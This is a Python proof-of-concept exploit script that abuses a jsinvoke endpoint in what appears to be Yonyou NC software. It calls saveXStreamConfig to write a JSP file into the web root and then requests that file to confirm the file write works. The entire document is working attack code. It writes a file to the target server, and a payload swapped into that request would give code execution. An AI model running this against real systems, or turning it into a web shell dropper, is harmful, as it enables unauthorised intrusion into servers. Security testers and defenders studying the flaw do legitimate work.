#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/uapjs/jsinvoke/?action=invoke"
    burp0_headers = {"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"}
    burp0_json={"methodName": "saveXStreamConfig", "parameters": ["vulntest", "webapps/nc_web/vulntest.jsp"], "parameterTypes": ["java.lang.Object", "java.lang.String"], "serviceName": "nc.itf.iufo.IBaseSPService"}
    r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
    if r.status_code == 200:
        shellpath = site + "/vulntest.jsp"
        r2 = requests.get(shellpath, headers=burp0_headers,  verify=False)
        if r2.status_code == 200 and "vulntest" in r2.text:
            return shellpath
    return ""
    
    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，文件上传后的路径为：", info)
    else:
        print("[-]漏洞不存在")
